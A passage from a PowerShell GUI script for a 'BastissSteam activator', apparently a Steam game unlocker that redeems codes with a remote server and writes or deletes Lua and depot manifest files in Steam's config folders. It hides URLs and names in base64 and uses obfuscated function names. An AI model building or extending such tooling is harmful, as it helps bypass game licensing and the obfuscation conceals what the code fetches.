function Remove-GamesForCode([string]$code) {
    $timers = At5Vc
    $rest = @()
    $removed = 0
    foreach ($t in $timers) {
        if ([string]$t.redeem_code -eq $code) {
            try {
                $root = [string]$t.steam_root
                foreach ($f in @($t.lua_files)) { Remove-FileHard (Join-Path (Join-Path $root "config\stplug-in") $f); Remove-FileHard (Join-Path (Join-Path $root "config\lua") $f) }
                foreach ($f in @($t.manifest_files)) { Remove-FileHard (Join-Path (Join-Path $root "config\depotcache") $f) }
                $removed++
            } catch {}
        } else { $rest += $t }
    }
    St7Xb $rest
    try { $script:activeCodes.RemoveAll({ param($c) [string]$c.Code -eq $code }) | Out-Null } catch {}
    Reset-LoteJobPending $code
    try { RfC } catch {}
    return $removed
}

function Get-ActiveCodeGroups {
    try {
        $queueStamp = 'missing'
        try {
            $queueFile = Get-Item -LiteralPath $script:LOTEQ_FILE -ErrorAction Stop
            $queueStamp = "$($queueFile.Length):$($queueFile.LastWriteTimeUtc.Ticks)"
        } catch {}

        $signature = New-Object System.Text.StringBuilder
        foreach ($c in @($script:activeCodes)) {
            $code = [string]$c.Code
            $duration = [string]$c.Duration
            $expires = [string]$c.ExpiresAt
            $activated = [string]$c.ActivatedAt
            [void]$signature.Append($code.Length).Append(':').Append($code).Append('|').Append($duration).Append('|').Append($expires).Append('|').Append($activated).Append(';')
        }
        $cacheKey = "$queueStamp|$($signature.ToString())"
        if ($script:activeCodeGroupsCacheKey -eq $cacheKey -and $null -ne $script:activeCodeGroupsCache) {
            return $script:activeCodeGroupsCache
        }

        $queue = @()
        try {
            if (Test-Path -LiteralPath $script:LOTEQ_FILE) {
                $queueJson = [System.IO.File]::ReadAllText($script:LOTEQ_FILE)
                if (-not [string]::IsNullOrWhiteSpace($queueJson)) { $queue = @(ConvertFrom-Json -InputObject $queueJson -ErrorAction Stop) }
            }
        } catch { $queue = @() }

        $groups = @{}
        foreach ($c in @($script:activeCodes)) {
            $key = [string]$c.Code
            if (-not $key) { continue }
            if (-not $groups.ContainsKey($key)) { $groups[$key] = @{ Code=$key; Games=0; ExpiresAt=$null; Duration=0; ActivatedAt=$null; Pending=0 } }
            $entry = $groups[$key]
            $entry.Games++
            try { if ($null -ne $c.Duration) { $entry.Duration = [int]$c.Duration } } catch {}
            if ($c.ExpiresAt) { if ($null -eq $entry.ExpiresAt -or $c.ExpiresAt -lt $entry.ExpiresAt) { $entry.ExpiresAt = $c.ExpiresAt } }
            if ($c.ActivatedAt) { if ($null -eq $entry.ActivatedAt -or $c.ActivatedAt -gt $entry.ActivatedAt) { $entry.ActivatedAt = $c.ActivatedAt } }
        }

        $jobsByCode = @{}
        foreach ($job in $queue) {
            $key = [string]$job.code
            if (-not $key) { continue }
            if (-not $jobsByCode.ContainsKey($key)) { $jobsByCode[$key] = $job }
            if (-not $groups.ContainsKey($key)) { $groups[$key] = @{ Code=$key; Games=0; ExpiresAt=$null; Duration=0; ActivatedAt=$null; Pending=0 } }
        }

        foreach ($entry in $groups.Values) {
            $job = $null
            if ($jobsByCode.ContainsKey([string]$entry.Code)) { $job = $jobsByCode[[string]$entry.Code] }
            if ($job) {
                $items = @($job.items)
                if ($items.Count -gt 0) { $entry.Games = $items.Count }
                try { if ($null -ne $job.duration) { $entry.Duration = [int]$job.duration } } catch {}
                if (-not $entry.ExpiresAt -and $job.expires_at) { try { $entry.ExpiresAt = [datetime]::Parse([string]$job.expires_at) } catch {} }
                $pending = 0
                foreach ($item in $items) { if ($item.status -ne 'done') { $pending++ } }
                $entry.Pending = $pending
            }
        }

        $result = @($groups.Values | Sort-Object -Property ActivatedAt -Descending)
        $script:activeCodeGroupsCacheKey = $cacheKey
        $script:activeCodeGroupsCache = $result
        return $result
    } catch { return @() }
}

function Get-LinksFromToken([string]$code) {
    try {
        $lt = Get-LocalToken
        if (-not $lt -or -not $lt.token) { return $null }
        $body = @{ token=[string]$lt.token; client_id=$script:clientId } | ConvertTo-Json
        try { Update-ServerUrl } catch {}
        $r = Invoke-RestMethod -Uri "$($script:serverUrl)/api/token-links" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30 -UseBasicParsing -ErrorAction Stop
        if ($r) { return $r }
    } catch {}
    return $null
}

function Update-CdPanelText {
    if (-not $script:cdp) { return }
    $code = [string]$script:cdCode
    $job = Get-LoteJob $code
    $tot = 0
    if ($job) { $tot = @($job.items).Count }
    $games = 0; $exp = $null
    foreach ($c in @($script:activeCodes)) {
        if ([string]$c.Code -eq $code) {
            if (-not [string]::IsNullOrEmpty([string]$c.Game)) { $games++ }
            if ($c.ExpiresAt) { if ($null -eq $exp -or $c.ExpiresAt -lt $exp) { $exp = $c.ExpiresAt } }
        }
    }
    if ($tot -gt 0) { $games = $tot; if (-not $exp -and $job.expires_at) { try { $exp = [datetime]::Parse([string]$job.expires_at) } catch {} } }
    if ($script:cdTitle) { $script:cdTitle.Text = $code }
    if ($script:cdSub) {
        if ($exp) {
            $off = if ($script:clockOffsetSec) { $script:clockOffsetSec } else { 0 }
            $now = (Get-Date).AddSeconds(-$off)
            $tl = $exp - $now
            if ($tl.TotalSeconds -le 0) { $script:cdSub.Text = "Expirado | $(Format-Juegos $games)" }
            elseif ($tl.TotalDays -ge 1) { $script:cdSub.Text = "Expira en $([int][math]::Floor($tl.TotalDays))d $($tl.Hours)h | $(Format-Juegos $games)" }
            else { $script:cdSub.Text = "Expira en $([int][math]::Floor($tl.TotalHours))h $($tl.Minutes)m | $(Format-Juegos $games)" }
        } else { $script:cdSub.Text = "Permanente | $(Format-Juegos $games)" }
    }
    if (-not $script:cdRunning) {
        if ($tot -gt 0) {
            $pendC = Get-JobPendingCount $code
            $doneC = $tot - $pendC
            $pctC = [int][math]::Floor(100 * $doneC / $tot)
            $script:cdPct = $pctC; $script:cdRunDone = $doneC; $script:cdRunTotal = $tot
            $script:cdEtaSec = -1
            if ($script:cdInfo) {
                if ($pendC -eq 0) { $script:cdInfo.Text = "Todos los juegos activados ($tot/$tot)" }
                elseif ($doneC -gt 0) { $script:cdInfo.Text = "Activacion pausada - $(Format-Juegos $pendC) pendientes" }
                else { $script:cdInfo.Text = "Listo para activar ($(Format-Juegos $tot))" }
            }
            if ($script:cdProg) {
                if ($pendC -eq 0) { $script:cdProg.ForeColor=$script:Green; $script:cdProg.Text = "$tot/$tot   |   100%" }
                elseif ($doneC -gt 0) { $script:cdProg.ForeColor=$script:Yellow; $script:cdProg.Text = "$doneC/$tot   |   $pctC%" }
                else { $script:cdProg.ForeColor=$script:Cyan; $script:cdProg.Text = "0/$tot   |   0%" }
            }
        } else {
            if ($script:cdProg) { $script:cdProg.Text = "" }
            if ($script:cdInfo) { $script:cdInfo.Text = "" }
            $script:cdPct = 0
        }
        if ($script:cdBar -and -not $script:cdBar.IsDisposed) { try { $script:cdBar.Invalidate() } catch {} }
    }
    if ($script:cdPause) {
        if ($script:cdPaused -or ($job -and $job.paused)) { $script:cdPause.Tag.Txt = "Reanudar activacion"; $script:cdPause.Tag.Sub = "Continua la activacion donde quedo" }
        else { $script:cdPause.Tag.Txt = "Pausar activacion"; $script:cdPause.Tag.Sub = "Pausa la activacion de los juegos" }
        $script:cdPause.Invalidate()
    }
}

function Toggle-CdPause {
    $code = [string]$script:cdCode
    $job = Get-LoteJob $code
    $wasPaused = ($script:cdPaused -or ($job -and $job.paused))
    $script:cdPaused = -not $wasPaused
    if ($job) { $job.paused = $script:cdPaused; Set-LoteJob $job }
    if (-not $script:cdPaused -and -not $script:cdRunning) {
        Invoke-LoteQueueForCode $code $script:cdProg
    }
    try { Update-CdPanelText } catch {}
}

function Clear-CdExpiredData([string]$code) {
    if (-not $code) { return }
    try {
        $lt = Get-LocalToken
        if ($lt -and [string]$lt.code -eq [string]$code) { Set-LocalToken '' $code }
    } catch {}
    try {
        $q = @(Get-LoteQueue)
        $left = @($q | Where-Object { [string]$_.code -ne [string]$code })
        if ($left.Count -ne $q.Count) { Save-LoteQueue $left }
    } catch {}
}

function Start-CdActivate {
    $code = [string]$script:cdCode
    if ($script:cdRunning) {
        if ($script:cdPaused) {
            $script:cdPaused = $false
            $j0 = Get-LoteJob $code
            if ($j0) { $j0.paused = $false; Set-LoteJob $j0 }
            try { Update-CdPanelText } catch {}
        } else {
            try { if ($script:cdInfo) { $script:cdInfo.Text = "Ya hay una activacion en curso, espera que termine..." } } catch {}
        }
        return
    }
    $job = Get-LoteJob $code
    if (-not $job -or $null -eq $job.items -or @($job.items).Count -eq 0) {
        $r = Get-LinksFromToken $code
        if (-not $r) { [System.Windows.Forms.MessageBox]::Show("No hay token local para este codigo o el servidor no respondio.","Activar juegos","OK","Warning"); return }
        if (-not $r.ok) { [System.Windows.Forms.MessageBox]::Show((if ($r.err) { [string]$r.err } else { "El servidor rechazo la vigencia de este codigo." }),"Activar juegos","OK","Warning"); return }
        $steamRoot = ""
        try { $steamRoot = Get-SteamPath } catch {}
        $dur = 0; try { $dur = [int]$r.duration } catch {}
        $exp = $null
        if ($r.expires_at) { try { $eVigF = [datetime]::Parse([string]$r.expires_at); if ($eVigF.Kind -eq [DateTimeKind]::Utc) { $eVigF = $eVigF.ToLocalTime() }; $exp = $eVigF } catch {} }
        if (-not $exp -and $dur -gt 0) { $exp = (Get-Date).AddSeconds($dur) }
        $job = New-LoteJob $code @($r.links) $dur $exp $steamRoot
        Set-LoteJob $job
    }
    $expBlk = $null
    if ($job.expires_at) { try { $expBlk = [datetime]::Parse([string]$job.expires_at) } catch {} }
    $jobDur = 0
    try { $jobDur = [int]$job.duration } catch {}
    if ($expBlk) {
        $nowBlk = Get-Date
        try { $nowBlk = $nowBlk.AddSeconds(-[int]$script:clockOffsetSec) } catch {}
        if ($expBlk.Kind -eq [DateTimeKind]::Utc) { $expBlk = $expBlk.ToLocalTime() }
        if ($expBlk -lt $nowBlk) {
            if ($jobDur -gt 0) { Clear-CdExpiredData $code }
            [System.Windows.Forms.MessageBox]::Show("La vigencia de este codigo ya termino: no se puede volver a activar los juegos.","Activar juegos","OK","Warning")
            return
        }
        if ($jobDur -gt 0) {
            $leftSpan = New-TimeSpan -Start $nowBlk -End $expBlk
            if ($leftSpan.TotalHours -le 1) {
                [System.Windows.Forms.MessageBox]::Show("Queda menos de 1 hora de vigencia para este codigo: no se puede volver a activar los juegos.","Activar juegos","OK","Warning")
                return
            }
        }
    }
    if ((Get-JobPendingCount $code) -eq 0) {
        [System.Windows.Forms.MessageBox]::Show("Los juegos de este codigo ya estan activados.`nSi faltan archivos, primero usa Borrar juegos y volve a activar.","Activar juegos","OK","Information")
        return
    }
    try { Update-CdPanelText } catch {}
    Invoke-LoteQueueForCode $code $script:cdProg
    try { Update-CdPanelText } catch {}
}

$CR=10

function New-RR{param([float]$x,[float]$y,[float]$w,[float]$h,[float]$r)
    if ($w -lt 1) { $w = 1 }; if ($h -lt 1) { $h = 1 }
    $d=$r*2; $m=[Math]::Min($w,$h); if ($d -gt $m) { $d = $m }; if ($d -lt 0) { $d = 0 }
    $p=New-Object System.Drawing.Drawing2D.GraphicsPath
    $p.AddArc($x,$y,$d,$d,180,90);$p.AddArc($x+$w-$d,$y,$d,$d,270,90)
    $p.AddArc($x+$w-$d,$y+$h-$d,$d,$d,0,90);$p.AddArc($x,$y+$h-$d,$d,$d,90,90)
    $p.CloseFigure();return $p}





$script:iconDir = Join-Path $env:TEMP (S("YnNtYXBfaWNvbnM="))
if (-not (Test-Path $script:iconDir)) { New-Item -ItemType Directory -Path $script:iconDir -Force | Out-Null }

$logoFile = $null
$logoPath = Join-Path $script:iconDir "logo.jpg"
try {
    if (-not (Test-Path $logoPath)) { Invoke-RestMethod -Uri (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvc3RlYW1zaXRvL21haW4vbG9nby5qcGc=") -UseBasicParsing -TimeoutSec 8 -OutFile $logoPath -ErrorAction SilentlyContinue }
    if (Test-Path $logoPath) { $logoFile = Get-Item $logoPath }
} catch {}
$script:LS = 72
$script:logoBmp = New-Object System.Drawing.Bitmap($script:LS, $script:LS)
$lg = [System.Drawing.Graphics]::FromImage($script:logoBmp)
$lg.SmoothingMode = 'AntiAlias'
$lg.PixelOffsetMode = 'HighQuality'
$lg.InterpolationMode = 'HighQualityBicubic'

if ($logoFile) {
    $src = [System.Drawing.Image]::FromFile($logoFile.FullName)
    
    $minDim = [Math]::Min($src.Width, $src.Height)
    $cropX = [int](($src.Width - $minDim) / 2)
    $cropY = [int](($src.Height - $minDim) / 2)
    $cropRect = New-Object System.Drawing.Rectangle($cropX, $cropY, $minDim, $minDim)
    
    $cp = New-Object System.Drawing.Drawing2D.GraphicsPath
    $cp.AddEllipse(0, 0, $script:LS, $script:LS)
    $lg.SetClip($cp)
    $lg.DrawImage($src, (New-Object System.Drawing.Rectangle(0, 0, $script:LS, $script:LS)), $cropRect, [System.Drawing.GraphicsUnit]::Pixel)
    $lg.ResetClip()
    $bp = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(70, 100, 140), 2.5)
    $lg.DrawEllipse($bp, 1, 1, $script:LS-3, $script:LS-3)
    $bp.Dispose(); $cp.Dispose(); $src.Dispose()
} else {
    
    $cp2 = New-Object System.Drawing.Drawing2D.GraphicsPath
    $cp2.AddEllipse(0,0,$script:LS,$script:LS); $lg.SetClip($cp2)
    $cel = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(108,172,228))
    $lg.FillRectangle($cel, 0, 0, $script:LS, $script:LS); $cel.Dispose()
    $wh = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    $sh = [int]($script:LS/3); $lg.FillRectangle($wh, 0, $sh, $script:LS, $sh); $wh.Dispose()
    $lg.ResetClip(); $cp2.Dispose()
}
$lg.Dispose()


$script:iconSize = 38
function Load-IconBmp([string]$filePath, [int]$sz) {
    $bmp = New-Object System.Drawing.Bitmap($sz, $sz)
    $ig2 = [System.Drawing.Graphics]::FromImage($bmp)
    $ig2.SmoothingMode = 'AntiAlias'
    $ig2.InterpolationMode = 'HighQualityBicubic'
    $ig2.PixelOffsetMode = 'HighQuality'
    if (Test-Path $filePath) {
        $srcI = [System.Drawing.Image]::FromFile($filePath)
        $minD = [Math]::Min($srcI.Width, $srcI.Height)
        $cx2 = [int](($srcI.Width - $minD) / 2)
        $cy2 = [int](($srcI.Height - $minD) / 2)
        $cropR = New-Object System.Drawing.Rectangle($cx2, $cy2, $minD, $minD)
        
        $cpI = New-Object System.Drawing.Drawing2D.GraphicsPath
        $cpI.AddEllipse(0, 0, $sz, $sz)
        $ig2.SetClip($cpI)
        $ig2.DrawImage($srcI, (New-Object System.Drawing.Rectangle(0, 0, $sz, $sz)), $cropR, [System.Drawing.GraphicsUnit]::Pixel)
        $ig2.ResetClip()
        $cpI.Dispose(); $srcI.Dispose()
    }
    $ig2.Dispose()
    return $bmp
}

$script:tiktokBmp = $null; $script:discordBmp = $null
try {
    $iconsBase = (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvc3RlYW1zaXRvL21haW4=")
    $tPath = Join-Path $script:iconDir "tiktok.jpg"; $dPath = Join-Path $script:iconDir (S("ZGlzY29yZC5qcGc="))
    if (-not (Test-Path $tPath)) { Invoke-RestMethod -Uri "$iconsBase/tiktok.jpg" -UseBasicParsing -TimeoutSec 8 -OutFile $tPath -ErrorAction SilentlyContinue }
    if (-not (Test-Path $dPath)) { Invoke-RestMethod -Uri "$iconsBase/discord.jpg" -UseBasicParsing -TimeoutSec 8 -OutFile $dPath -ErrorAction SilentlyContinue }
    if (Test-Path $tPath) { $script:tiktokBmp = Load-IconBmp $tPath $script:iconSize }
    if (Test-Path $dPath) { $script:discordBmp = Load-IconBmp $dPath $script:iconSize }
} catch {}




$PAD=18;$FW=480;$CW=$FW-(2*$PAD);$GAP=10
$HW=[int](($CW-$GAP)/2);$CH=76;$FCH=68

$HH=115;$CY=$HH

$R1Y=0;$R2Y=$CH+$GAP
$WEB_Y=$R2Y+$CH+12;$DISC_Y=$WEB_Y+$FCH+$GAP;$TIK_Y=$DISC_Y+$FCH+$GAP
$SAL_Y=$TIK_Y+$FCH+12;$SAL_H=40
$FH=$CY+$SAL_Y+$SAL_H+14




$form=New-Object System.Windows.Forms.Form
$form.Text="BastissSteam activator"
$form.ClientSize=New-Object System.Drawing.Size($FW,$FH)
$form.StartPosition="CenterScreen";$form.BackColor=$BG
$form.FormBorderStyle="Sizable";$form.MaximizeBox=$true
$form.TopMost=$true
$form.Add_Shown({ $this.Activate(); $this.BringToFront(); try { $this.TopMost=$false } catch {} })
$form.Add_Shown({ try { [WinFg]::SetForegroundWindow($this.Handle) | Out-Null; [WinFg]::ShowWindow($this.Handle, 9) | Out-Null } catch {} })
$form.Add_Shown({ try { Start-DeferredInit } catch {} })
$form.Add_Shown({ try { Check-AppUpdate } catch {} })
$script:lastNonMinimizedWindowState = 'Normal'
$form.Add_Resize({
    try { $hp.Invalidate() } catch {}
    try {
        if ($form.WindowState -eq 'Minimized') {
            foreach ($timer in @($script:bibTimer,$script:bibRenderTimer,$script:bibLoadingTimer,$script:bibNameTimer,$script:bdtDlTimer,$script:bibDetailTimer,$script:bibRepairTimer)) { if ($timer) { $timer.Stop() } }
            return
        }
        $script:lastNonMinimizedWindowState = $form.WindowState
        if ($script:bibp -and $script:bibp.Visible) {
            Set-BiblioLayout
            if ($script:bibGames -and $script:bibFlow.Controls.Count -eq 0 -and $script:bibRenderQueue.Count -eq 0) { Refresh-BiblioGrid $script:bibSearch.Text }
            if ($script:bibRenderIndex -lt $script:bibRenderQueue.Count) { $script:bibRenderTimer.Start() }
            if ($script:bibLoadingCard.Visible) { $script:bibLoadingTimer.Start() }
            if ($script:bibCoverJobs.Count -gt 0 -or $script:bibCoverQueue.Count -gt 0) { $script:bibTimer.Start() }
        }
    } catch {}
})
$form.Add_Activated({
    try {
        if ($form.WindowState -eq 'Minimized') { return }
        if ($script:bibp -and $script:bibp.Visible) {
            Set-BiblioLayout
            if ($script:bibGames -and $script:bibFlow.Controls.Count -eq 0 -and $script:bibRenderQueue.Count -eq 0) { Refresh-BiblioGrid $script:bibSearch.Text }
            if ($script:bibRenderIndex -lt $script:bibRenderQueue.Count) { $script:bibRenderTimer.Start() }
            if ($script:bibCoverJobs.Count -gt 0 -or $script:bibCoverQueue.Count -gt 0) { $script:bibTimer.Start() }
        }
    } catch {}
})


$ib=New-Object System.Drawing.Bitmap(64,64)
$ig=[System.Drawing.Graphics]::FromImage($ib);$ig.SmoothingMode='AntiAlias'
$ig.InterpolationMode='HighQualityBicubic'
$cpIcon=New-Object System.Drawing.Drawing2D.GraphicsPath
$cpIcon.AddEllipse(0,0,64,64);$ig.SetClip($cpIcon)
if($logoFile){
    $srcIcon=[System.Drawing.Image]::FromFile($logoFile.FullName)
    $minI=[Math]::Min($srcIcon.Width,$srcIcon.Height)
    $cxI=[int](($srcIcon.Width-$minI)/2);$cyI=[int](($srcIcon.Height-$minI)/2)
    $ig.DrawImage($srcIcon,(New-Object System.Drawing.Rectangle(0,0,64,64)),(New-Object System.Drawing.Rectangle($cxI,$cyI,$minI,$minI)),[System.Drawing.GraphicsUnit]::Pixel)
    $srcIcon.Dispose()
}
$ig.ResetClip();$cpIcon.Dispose();$ig.Dispose()
$form.Icon=[System.Drawing.Icon]::FromHandle($ib.GetHicon())
$form.Add_HandleCreated({$v=[int]1;[DwmHelper]::DwmSetWindowAttribute($form.Handle,20,[ref]$v,4)|Out-Null})




$hp=New-BufferedPanel
$hp.Location=New-Object System.Drawing.Point(0,0)
$hp.Size=New-Object System.Drawing.Size($FW,$HH);$hp.BackColor=$BG;$hp.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right)
$hp.Add_Paint({
    param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $g.InterpolationMode='HighQualityBicubic'

    
    $fntMain=New-Object System.Drawing.Font("Bahnschrift SemiBold",26,[System.Drawing.FontStyle]::Bold)
    $fntTag=New-Object System.Drawing.Font("Bahnschrift Light",9)

    
    $titleText="BastissSteam"
    $titleSz=$g.MeasureString($titleText,$fntMain)
    $tagText="activator"
    $tagSz=$g.MeasureString($tagText,$fntTag)

    
    $titleBlockH=$titleSz.Height + $tagSz.Height - 10
    $groupW=$script:LS + 12 + [Math]::Max($titleSz.Width, $tagSz.Width)
    $startX=[int](($s.Width - $groupW) / 2)

    
    if ($script:logoBmp) {
        $ly=[int](($s.Height - $script:LS) / 2 - 2)
        $g.DrawImage($script:logoBmp,$startX,$ly,$script:LS,$script:LS)
    }

    
    $tx=$startX+$script:LS+12
    $ty=[int](($s.Height - $titleBlockH) / 2 - 2)

    
    $cyanBr=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(0,200,255))
    $whiteBr=New-Object System.Drawing.SolidBrush($script:White)

    
    $bastissOnly=$g.MeasureString("Bastiss",$fntMain)
    $g.DrawString("Bastiss",$fntMain,$cyanBr,$tx,$ty)
    
    $steamX=$tx+$bastissOnly.Width-12
    $g.DrawString("Steam",$fntMain,$whiteBr,$steamX,$ty)

    
    $tagBr=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(80,95,115))
    $tagX=$tx+($titleSz.Width-$tagSz.Width)/2
    $tagY=$ty+$titleSz.Height-10
    $g.DrawString($tagText,$fntTag,$tagBr,$tagX,$tagY)

    $cyanBr.Dispose();$whiteBr.Dispose();$tagBr.Dispose()
    $fntMain.Dispose();$fntTag.Dispose()

    
    $sp=New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(25,255,255,255),1)
    $g.DrawLine($sp,$PAD,$s.Height-1,$s.Width-$PAD,$s.Height-1);$sp.Dispose()
})
$form.Controls.Add($hp)


$script:gearBtn=New-Object System.Windows.Forms.Label
$script:gearBtn.Text="config";$script:gearBtn.Font=$FntSub
$script:gearBtn.ForeColor=[System.Drawing.Color]::FromArgb(60,70,90);$script:gearBtn.BackColor=$BG
$script:gearBtn.AutoSize=$true;$script:gearBtn.Cursor=[System.Windows.Forms.Cursors]::Hand
$script:gearBtn.Location=New-Object System.Drawing.Point(($FW-60),($HH-25))
$script:gearBtn.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:gearBtn.Add_MouseEnter({param($s);$s.ForeColor=$script:Cyan})
$script:gearBtn.Add_MouseLeave({param($s);$s.ForeColor=[System.Drawing.Color]::FromArgb(60,70,90)})
$script:gearBtn.Add_Click({Switch-ToConfig})
$hp.Controls.Add($script:gearBtn)




function New-Card{param([int]$X,[int]$Y,[int]$W,[int]$H,[string]$Title,[string]$Sub,[string]$Icon,[scriptblock]$Click)
    $pn=New-BufferedPanel
    $pn.Location=New-Object System.Drawing.Point($X,$Y)
    $pn.Size=New-Object System.Drawing.Size($W,$H);$pn.BackColor=$BG
    $pn.Cursor=[System.Windows.Forms.Cursors]::Hand
    $pn.Tag=@{Hover=$false;Icon=$Icon;Title=$Title;Sub=$Sub}
    $pn.Add_MouseEnter({param($s,$e2);$s.Tag.Hover=$true;$s.Invalidate()})
    $pn.Add_MouseLeave({param($s,$e2);$s.Tag.Hover=$false;$s.Invalidate()})
    if($Click){$pn.Add_Click($Click)}
    $pn.Add_Paint({
        param($s,$e)
        $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
        $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
        $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) $CR
        $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
        $tx2=56;$ty2=[int](($s.Height/2)-18);$sy2=[int](($s.Height/2)+3)
        $ic=30;$iy=[int]($s.Height/2)

        switch($n.Icon){
            "lightning"{
                $lBr=New-Object System.Drawing.SolidBrush($script:Cyan)
                $pts=@((New-Object System.Drawing.PointF(($ic+6),($iy-17))),(New-Object System.Drawing.PointF(($ic-2),($iy-2))),
                    (New-Object System.Drawing.PointF(($ic+5),($iy-2))),(New-Object System.Drawing.PointF(($ic-3),($iy+17))))
                
                $boltPath=New-Object System.Drawing.Drawing2D.GraphicsPath
                $boltPath.AddPolygon(@(
                    (New-Object System.Drawing.PointF(($ic+5),($iy-17))),
                    (New-Object System.Drawing.PointF(($ic-4),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic+1),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic-1),($iy-4))),
                    (New-Object System.Drawing.PointF(($ic+6),($iy-4))),
                    (New-Object System.Drawing.PointF(($ic+8),($iy-17)))
                ))
                $g.FillPolygon($lBr, @(
                    (New-Object System.Drawing.PointF(($ic+1),($iy-18))),
                    (New-Object System.Drawing.PointF(($ic-6),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic+2),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic-4),($iy+18))),
                    (New-Object System.Drawing.PointF(($ic+3),($iy+4))),
                    (New-Object System.Drawing.PointF(($ic-2),($iy+4))),
                    (New-Object System.Drawing.PointF(($ic+7),($iy-12)))
                ))
                $lBr.Dispose()
            }
            "webpage"{
                $wp=New-Object System.Drawing.Pen($script:Cyan,1.8);$r3=12
                $g.DrawEllipse($wp,($ic-$r3),($iy-$r3),($r3*2),($r3*2))
                $g.DrawLine($wp,$ic,($iy-$r3),$ic,($iy+$r3))
                $g.DrawLine($wp,($ic-$r3),$iy,($ic+$r3),$iy)
                $g.DrawEllipse($wp,($ic-5),($iy-$r3),10,($r3*2))
                
                $ap=New-Object System.Drawing.Pen($script:Cyan,2)
                $g.DrawLine($ap,($ic+5),($iy-9),($ic+13),($iy-9))
                $g.DrawLine($ap,($ic+13),($iy-9),($ic+13),($iy-1))
                $g.DrawLine($ap,($ic+13),($iy-9),($ic+6),($iy-2))
                $wp.Dispose();$ap.Dispose()
            }
            "globe"{
                $gp=New-Object System.Drawing.Pen($script:Cyan,1.6);$r3=12
                $g.DrawEllipse($gp,($ic-$r3),($iy-$r3),($r3*2),($r3*2))
                $g.DrawLine($gp,$ic,($iy-$r3),$ic,($iy+$r3))
                $g.DrawLine($gp,($ic-$r3),$iy,($ic+$r3),$iy)
                $g.DrawEllipse($gp,($ic-6),($iy-$r3),12,($r3*2))
                $gp.Dispose()
            }
            "trash"{
                $tp=New-Object System.Drawing.Pen($script:Cyan,1.8)
                $g.DrawLine($tp,($ic-11),($iy-10),($ic+11),($iy-10))
                $g.DrawLine($tp,($ic-3),($iy-10),($ic-3),($iy-14))
                $g.DrawLine($tp,($ic+3),($iy-10),($ic+3),($iy-14))
                $g.DrawLine($tp,($ic-3),($iy-14),($ic+3),($iy-14))
                $g.DrawLine($tp,($ic-9),($iy-8),($ic-7),($iy+14))
                $g.DrawLine($tp,($ic+9),($iy-8),($ic+7),($iy+14))
                $g.DrawLine($tp,($ic-7),($iy+14),($ic+7),($iy+14))
                $tn=New-Object System.Drawing.Pen($script:Cyan,1.2)
                $g.DrawLine($tn,$ic,($iy-5),$ic,($iy+10))
                $g.DrawLine($tn,($ic-4),($iy-5),($ic-4),($iy+10))
                $g.DrawLine($tn,($ic+4),($iy-5),($ic+4),($iy+10))
                $tp.Dispose();$tn.Dispose()
            }
            "discord"{
                if ($script:discordBmp) {
                    $g.InterpolationMode='HighQualityBicubic'
                    $isz=$script:iconSize;$ix2=$ic-[int]($isz/2);$iy2=$iy-[int]($isz/2)
                    $g.DrawImage($script:discordBmp,$ix2,$iy2,$isz,$isz)
                }
            }
            "tiktok"{
                if ($script:tiktokBmp) {
                    $g.InterpolationMode='HighQualityBicubic'
                    $isz=$script:iconSize;$ix2=$ic-[int]($isz/2);$iy2=$iy-[int]($isz/2)
                    $g.DrawImage($script:tiktokBmp,$ix2,$iy2,$isz,$isz)
                }
            }
        }
        $tb=New-Object System.Drawing.SolidBrush($script:White)
        $g.DrawString($n.Title,$script:FntCard,$tb,$tx2,$ty2);$tb.Dispose()
        if($n.Sub){$sb=New-Object System.Drawing.SolidBrush($script:Gray)
            $g.DrawString($n.Sub,$script:FntSub,$sb,$tx2,$sy2);$sb.Dispose()}
        $ab=New-Object System.Drawing.SolidBrush($script:Cyan)
        $asz=$g.MeasureString(">",$script:FntArrow)
        $g.DrawString(">",$script:FntArrow,$ab,$s.Width-$asz.Width-10,($s.Height-$asz.Height)/2);$ab.Dispose()
    })
    return $pn
}




function Switch-ToRedeem{$script:mp.Visible=$false;$script:sp.Visible=$false;if($script:cdp){$script:cdp.Visible=$false};$script:rp.Visible=$true;RfC}
function Switch-ToMain{$script:rp.Visible=$false;$script:sp.Visible=$false;if($script:cdp){$script:cdp.Visible=$false};$script:bibp.Visible=$false;$script:mp.Visible=$true}
function Switch-ToConfig{$script:mp.Visible=$false;$script:rp.Visible=$false;if($script:cdp){$script:cdp.Visible=$false};$script:bibp.Visible=$false;$script:sp.Visible=$true;$script:sWatcher.Invalidate()}
function Switch-FromConfig{$script:sp.Visible=$false;$script:mp.Visible=$true}
function Switch-ToCodes{if($script:cdp){$script:cdp.Visible=$false};$script:mp.Visible=$false;$script:sp.Visible=$false;$script:bibp.Visible=$false;$script:rp.Visible=$true;try{Update-CdPanelText}catch{};RfC}
function Switch-ToCodeDetail([string]$code){
    $script:cdCode=$code
    $script:mp.Visible=$false;$script:rp.Visible=$false;$script:sp.Visible=$false;$script:bibp.Visible=$false
